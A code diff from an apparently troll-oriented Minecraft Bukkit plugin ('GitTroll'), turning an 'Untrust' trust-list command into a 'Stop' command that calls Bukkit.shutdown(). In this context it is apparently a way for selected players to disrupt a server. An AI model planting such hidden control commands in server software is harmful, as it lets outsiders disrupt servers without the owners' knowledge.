@@ -1,22 +1,23 @@
-package net.Lenni0451.GitTroll.command.commands.player;
+package net.Lenni0451.GitTroll.command.commands.server;
 
 import java.util.List;
 
-import net.Lenni0451.GitTroll.GitTroll;
+import org.bukkit.Bukkit;
+
 import net.Lenni0451.GitTroll.command.CommandBase;
 import net.Lenni0451.GitTroll.utils.ArrayHelper;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
 
-public class Untrust extends CommandBase {
+public class Stop extends CommandBase {
 
-	public Untrust() {
-		super("Untrust", "Remove yourself from the trust list");
+	public Stop() {
+		super("Stop", "Stop the server");
 	}
 
 	@Override
 	public void execute(CustomPlayer executor, ArrayHelper args) {
 		if(args.isEmpty()) {
-			GitTroll.getInstance().untrustPlayer(executor.getPlayer());
+			Bukkit.shutdown();
 		} else {
 			this.commandWrong();
 		}
